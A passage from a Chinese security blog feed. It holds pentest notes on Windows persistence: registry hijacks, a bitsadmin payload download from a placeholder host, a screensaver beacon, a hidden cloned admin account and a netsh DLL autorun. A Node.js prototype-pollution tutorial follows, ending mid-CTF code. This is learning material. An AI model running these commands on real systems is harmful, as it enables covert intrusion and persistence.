alt="image-20220308184001989"></p><h1 id="0x6-Logon-Scripts后门"><a href="#0x6-Logon-Scripts后门" class="headerlink" title="0x6.Logon Scripts后门"></a>0x6.Logon Scripts后门</h1><p>Windows登录脚本，当用户登录时触发，<strong>Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截</strong>。</p><p>注册表位置:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Environment</span><br></pre></td></tr></table></figure><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308184533410.png" alt="image-20220308184533410"></p><h1 id="0x7-文件关联"><a href="#0x7-文件关联" class="headerlink" title="0x7.文件关联"></a>0x7.文件关联</h1><p>文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系，一个文件可以与多个应用程序发生关联。</p><p>可以用assoc命令显示或修改文件扩展名关联，使用ftype显示或修改文件类型</p><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308185550636.png" alt="image-20220308185550636"></p><p>需要管理员权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKCR\txtfile\shell\open\command&quot; /ve /t REG_EXPAND_SZ /d &quot;C:\Windows\system32\cmd.exe %1&quot; /f</span><br></pre></td></tr></table></figure><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308185838423.png" alt="image-20220308185838423"></p><h1 id="0x8-Bitsadmin"><a href="#0x8-Bitsadmin" class="headerlink" title="0x8.Bitsadmin"></a>0x8.Bitsadmin</h1><blockquote><p>  <a href="https://toutiao.io/posts/bcz5e1o/preview">BITSAdmin的介绍与Windows渗透测试中的使用</a></p><p>  <a href="https://micro8.gitbook.io/micro8/contents-1/41-50/41bitsadmin-yi-ju-hua-xia-zai-payload">bitsadmin一句话下载payload</a></p></blockquote><blockquote><p>  Windows操作系统包含各种实用程序，系统管理员可以使用它们来执行各种任务。这些实用程序之一是后台智能传输服务（BITS），它可以促进文件到Web服务器（HTTP）和共享文件夹（SMB）的传输能力。Microsoft提供了一个名为“ bitsadmin ” 的二进制文件和PowerShell cmdlet，用于创建和管理文件传输。</p></blockquote><p>window7以上自带：<code>c:\windows\system32\bitsadmin.exe</code></p><p>使用功能transfer参数下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\bitsadmin.exe /transfer backdoor &quot;http://sssssssss/CM.EXE&quot; C:\1.exe</span><br></pre></td></tr></table></figure><p>复制本地文件：</p><p>BITSAdmin遵循文件传输的原则。因此，可以将其用作复制和粘贴命令。这意味着BITSAdmin也能将同一台计算机上的一个位置传输到另一个位置。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /create whitehat_day <span class="comment">#创建一个whitehat_day的任务。</span></span><br><span class="line"><span class="comment">#使用/addfile参数将传输文件添加到whitehat_day任务中，并声明传输的文件名与路径，和保存位置与名称</span></span><br><span class="line">bitsadmin /addfile whitehat_day d:\file.txt d:\testfile.txt</span><br><span class="line">bitsadmin /resume whitehat_day<span class="comment">#使用/resume参数来开启传输。</span></span><br><span class="line">bitsadmin /complete whitehat_day<span class="comment">#以临时文件的形式传输文件。要获取完整的文件，需要使用/complete参数</span></span><br><span class="line">Get-ChildItem -Path d:\  <span class="comment">#查看目标路径下是否存在file.txt</span></span><br></pre></td></tr></table></figure><h1 id="0x9-屏幕保护程序"><a href="#0x9-屏幕保护程序" class="headerlink" title="0x9.屏幕保护程序"></a>0x9.屏幕保护程序</h1><blockquote><p>  利用前提:对方开启了屏幕保护</p><p>  屏幕保护程序，当初的设计是为了防止长期屏幕的显示，预防老化与缩短屏幕显示器老化的一种保护程序。</p></blockquote><p>注册表位置:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive</span><br><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure</span><br><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut</span><br><span class="line">HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;hkcu\control panel\desktop&quot; /v SCRNSAVE.EXE /d C:\Users\hunter\Desktop\beacon.exe /f</span><br><span class="line">reg add &quot;hkcu\control panel\desktop&quot; /v ScreenSaveActive /d 1 /f</span><br><span class="line">reg add &quot;hkcu\control panel\desktop&quot; /v ScreenSaverIsSecure /d 0 /f</span><br><span class="line">reg add &quot;hkcu\control panel\desktop&quot; /v ScreenSaveTimeOut /d 60 /f</span><br></pre></td></tr></table></figure><p>如果从未设置过屏保程序的话，除“ScreenSaveActive”默认值为1，其他键都是不存在的，而屏保程序的正常运行必须保证这几个键都有数据才可以，因此必须把4个键都重写一遍。另外，经测试屏保程序最短触发时间为60秒，即使改成小于60的数值，依然还是60秒后执行程序。<br>当然，从注册表路径也可以看出这种方式只能获得当前用户权限的shell，优点是不需要提权即可维持。</p><h1 id="0xA-WMI构造无文件后门（待完成）"><a href="#0xA-WMI构造无文件后门（待完成）" class="headerlink" title="0xA WMI构造无文件后门（待完成）"></a>0xA WMI构造无文件后门（待完成）</h1><p>WMI(Windows Management Instrumentation，即Windows管理规范)，大多数基于Windows的软件依赖于此服务。</p><blockquote><p>  <a href="https://wooyun.js.org/drops/WMI%20%E7%9A%84%E6%94%BB%E5%87%BB%EF%BC%8C%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E4%B9%8B%E6%94%BB%E5%87%BB%E7%AF%87.html">WMI的攻击，防御与取证分析技术之攻击篇</a></p><p>  <a href="https://xz.aliyun.com/t/2080">wmi与vbs</a></p><p>  <a href="https://m0nst3r.me/pentest/%E5%88%A9%E7%94%A8WMI%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%8C%81%E4%B9%85%E5%8C%96%E7%9A%84%E5%BC%82%E6%AD%A5%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8.html">利用WMI构建一个持久化的异步的无文件后门</a></p><p>  <a href="https://blog.51cto.com/antivirusjo/2092545">WMI利用专题</a></p><p>  <a href="https://www.anquanke.com/post/id/88851">Powershell攻击指南黑客后渗透之道系列——进阶利用</a></p><p>  <a href="https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html">A WMI Based Agentless Post-Exploitation RAT Developed in PowerShell</a></p><p>  <a href="https://www.tuicool.com/articles/zmUVbyJ">WMI Backdoor</a></p><p>  <a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor">Appendix L: Events to Monitor</a></p><p>  <a href="http://demon.tw/copy-paste/vbs-wmi-trojan-3.html">利用WMI打造完美“三无”后门</a></p><p>  <a href="https://www.tuicool.com/articles/IzieuyR">如何检测并移除WMI持久化后门？</a></p><p>  <a href="https://www.anquanke.com/post/id/85851">解析APT29的无文件WMI和PowerShell后门</a></p><p>  <a href="https://www.aqniu.com/learn/31053.html">无文件攻击的兴起与应对之道</a></p></blockquote><h1 id="0xB-影子用户"><a href="#0xB-影子用户" class="headerlink" title="0xB.影子用户"></a>0xB.影子用户</h1><p>即创建的隐藏用户，它无法通过普通命令进行查询，比较隐蔽。（要管理员）</p><p>创建个隐藏用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user test$ 123456 /add</span><br><span class="line">net localgroup administrators test$ /add</span><br></pre></td></tr></table></figure><p>net user无法查看</p><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308193032710.png" alt="image-20220308193032710"></p><p>但是可以在计算机管理和登陆页面中看到</p><p>下面解决这个问题：</p><p>修改<code>HKEY_LOCAL_MACHINE\SAM\SAM</code> admin的权限为完全控制和读取，重新打开后导出3个内容：</p><p>test$导出为1.reg<br>000003EC包含test$用户的F值，导出另存为2.reg<br>000003E9包含WIN10用户的F值，导出另存为3.reg</p><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308194155751.png" alt="image-20220308194155751"></p><p>将2.reg中的F值替换为3.reg中的F值，即将test$用户的F值替换为WIN10用户的F值.</p><p>删除test$用户，之后注册表就 无法打开了，导入1,2注册表：</p><p><img src="/2022/03/08/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0/image-20220308194707146.png" alt="image-20220308194707146"></p><p>这时登陆界面已经没有账户了，3389可以直接登陆，以test$用户登陆，登陆之后的身份是原来WIN10用户，桌面也是原用户的，达到克隆效果。这个时候再用<code>net user test$ /del</code>是删除不掉这个用户的，只能通过注册表来删除。</p><h1 id="0xC-Netsh"><a href="#0xC-Netsh" class="headerlink" title="0xC.Netsh"></a>0xC.Netsh</h1><p>权限要求：未降权的管理员权限。<br>netsh也是Windows自带的命令，是用来配置网络的命令行工具。该工具可以通过导入helperdll的方式实现功能，且DLL导入后会写进注册表，永久有效.</p><p>关于<code>helper dll</code>的编写可以参考这个项目：<a href="https://github.com/outflanknl/NetshHelperBeacon">NetshHelperBeacon</a></p><p>注册表位置：<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</code></p><p>netsh并不会开启自启动，因此还要再写一条自启动项：<br><code>reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Pentestlab /t REG_SZ /d &quot;cmd /c C:\Windows\System32\netsh&quot;</code></p><blockquote><p>  <a href="https://xz.aliyun.com/t/9718">Windows权限维持总结</a></p><p>  <a href="https://xz.aliyun.com/t/8095">Windows权限维持整理</a></p><p>  <a href="https://bypass007.github.io/Emergency-Response-Notes/privilege/">权限维持篇</a></p><p>  <a href="https://xz.aliyun.com/t/6461">windows中常见后门持久化方法总结</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;简单记录下Windows权限维持的内容。&lt;/p&gt;
&lt;h1 id=&quot;0x1-辅助功能镜像劫持&quot;&gt;&lt;a href=&quot;#0x1-辅助功能镜像劫持&quot; class=&quot;headerlink&quot; title=&quot;0x1 辅助功能镜像劫持&quot;&gt;&lt;/a&gt;0x1 辅助功能镜</summary>
      
    
    
    
    
    <category term="渗透" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Nodejs原型链污染</title>
    <link href="http://example.com/2022/03/01/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>http://example.com/2022/03/01/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2022-02-28T16:00:00.000Z</published>
    <updated>2022-03-01T12:41:53.688Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="NodeJs基础"><a href="#NodeJs基础" class="headerlink" title="NodeJs基础"></a>NodeJs基础</h1><p>好像也没啥写的。。</p><h2 id="child-process-创建子进程"><a href="#child-process-创建子进程" class="headerlink" title="child_process(创建子进程)"></a>child_process(创建子进程)</h2><p>分为异步和同步：</p><p>异步：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">child_process.exec(command[, options][, callback])</span><br><span class="line">child_process.execFile(file[, args][, options][, callback])</span><br><span class="line">child_process.fork(modulePath[, args][, options])</span><br><span class="line">child_process.spawn(command[, args][, options])</span><br></pre></td></tr></table></figure><p>同步：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">child_process.execFileSync(file[, args][, options])</span><br><span class="line">child_process.execSync(command[, options])</span><br><span class="line">child_process.spawnSync(command[, args][, options])</span><br></pre></td></tr></table></figure><p>异步中，<code>spawn</code>是基础，其他的<code>fork</code>、<code>exec</code>、<code>execFile</code>都是基于<code>spawn</code>来生成的。</p><h2 id="Javascript原型链"><a href="#Javascript原型链" class="headerlink" title="Javascript原型链"></a>Javascript原型链</h2><blockquote><p>  <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain</a></p></blockquote><h3 id="原型与原型链"><a href="#原型与原型链" class="headerlink" title="原型与原型链"></a>原型与原型链</h3><p>js中没有子类父类的概念，也没有类和实例，js中的继承使用”原型链”来实现。</p><p>JS中几乎所有的事物都是对象，如下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;asdf&quot;</span>,    </span><br><span class="line">    <span class="string">&quot;blog&quot;</span>: <span class="string">&quot;https://asdf.github.io&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">a.name;</span><br><span class="line">a.blog;</span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br></pre></td></tr></table></figure><p>其中访问对像的属性，可以有两种方式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.name; </span><br><span class="line">a[<span class="string">&quot;name&quot;</span>];</span><br></pre></td></tr></table></figure><h3 id="原型的定义和继承"><a href="#原型的定义和继承" class="headerlink" title="原型的定义和继承"></a>原型的定义和继承</h3><p>在javascript中一切皆对象，因为所有的变量，函数，数组，对象 都始于object的原型即object.prototype</p><p>每个实例对象（object）都有一个私有属性（称之为 __proto__ ）指向它的构造函数的原型对象（prototype）。即任何对象都是由一个构造函数创建的.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">Father</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.first_name = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="keyword">this</span>.last_name = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">Son</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.first_name = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father()</span><br><span class="line"></span><br><span class="line">let son = <span class="keyword">new</span> Son()</span><br><span class="line">console.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`)</span><br><span class="line"><span class="comment">//Son类继承了Father类的last_name属性，最后输出的是Name: Melania Trump。</span></span><br></pre></td></tr></table></figure><p>对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：(查找顺序)</p><ol><li> 在对象son中寻找last_name</li><li> 如果找不到，则在<code>son.__proto__</code>中寻找last_name</li><li> 如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li><li> 依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li></ol><blockquote><p>  当谈到继承时，JavaScript 只有一种结构：对象。每个实例对象（object）都有一个私有属性（称之为 __proto__ ）指向它的构造函数的原型对象（prototype）。该原型对象也有一个自己的原型对象（__proto__），层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<strong>原型链</strong>中的最后一个环节。</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">name,age</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a函数内容是a类的构造函数，其中<code>this.name</code>、<code>this.age</code>就是a类的属性。</p><p>在JavaScript中，声明了一个函数a，然后浏览器就自动在内存中创建一个对象b，a函数默认有一个属性(原型对象:prototype)指向了这个对象b，b就是函数a的原型对象，简称原型。同时，对象b默认有属性constructor指向函数a。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; a.prototype</span><br><span class="line">&#123;&#125; </span><br><span class="line">&gt; a.prototype.constructor</span><br><span class="line">[<span class="built_in">Function</span>: a]</span><br></pre></td></tr></table></figure><p>创建一个对象a，对象a会默认有一个属性proto指向构造函数A的原型对象b</p><p><code>A.prototype == a.__proto__</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; <span class="keyword">let</span> a = <span class="keyword">new</span> A();</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; A.prototype = a.__proto__</span><br><span class="line">&#123;&#125;</span><br><span class="line">&gt; a.constructor</span><br><span class="line">[<span class="built_in">Function</span>: A]</span><br></pre></td></tr></table></figure><p>当要使用或输出一个变量时：首先会在本层中搜索相应的变量，如果不存在的话，就会向上搜索，即在自己的父类中搜索，当父类中也没有时，就会向祖父类搜索，直到指向null，如果此时还没有搜索到，就会返回 undefined。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; a.__proto__</span><br><span class="line">&#123;&#125;</span><br><span class="line">&gt; a.__proto__.__proto__</span><br><span class="line">[<span class="built_in">Object</span>: <span class="literal">null</span> prototype] &#123;&#125;</span><br><span class="line">&gt; a.__proto__.__proto__.__proto__</span><br></pre></td></tr></table></figure><p><img src="/2022/03/01/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/Veur1v6GwiNs3bQ.png" alt="img"></p><p>由于对象之间存在继承关系，所以当我们要使用或者输出一个变量就会通过原型链向上搜索，当上层没有就会再向上上层搜索，直到指向 null，若此时还未找到就会返回 undefined</p><p>图中的原型链是 <code>cat-&gt;Cat.protype-&gt;Object.prototype-&gt;null</code></p><p><img src="/2022/03/01/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/SL3NypUdR5MlDAo.png" alt="img"></p><h1 id="NodeJs原型链污染"><a href="#NodeJs原型链污染" class="headerlink" title="NodeJs原型链污染"></a>NodeJs原型链污染</h1><p>原型链污染就是修改其构造函数中的属性值，使其他通过该构造函数实例化出的对象也具有这个属性的值。</p><p><code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果我们修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？demo:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.__proto__.bar = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="built_in">console</span>.log(zoo.bar)</span><br></pre></td></tr></table></figure><p>foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p><p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p><p>可能存在原型链污染的情况：</p><ul><li>  对象merge</li><li>  对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li></ul><p>以merge举例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个key如果是<code>__proto__</code>，就有可能造成原型链污染。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure><p>没有成功，这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p><p>那么，如何让<code>__proto__</code>被认为是一个键名呢？</p><p>我们将代码改成如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure><p>成功污染。在JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p><h1 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h1><h2 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h2><p>好吧，其实这个不是原型链污染的题，做完才发现。。但还是学到很多</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">&#x27;cookie-session&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">&#x27;./key.js&#x27;</span>).keys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> crypto.createHash(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">        .update(s)</span><br><span class="line">        .digest(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span 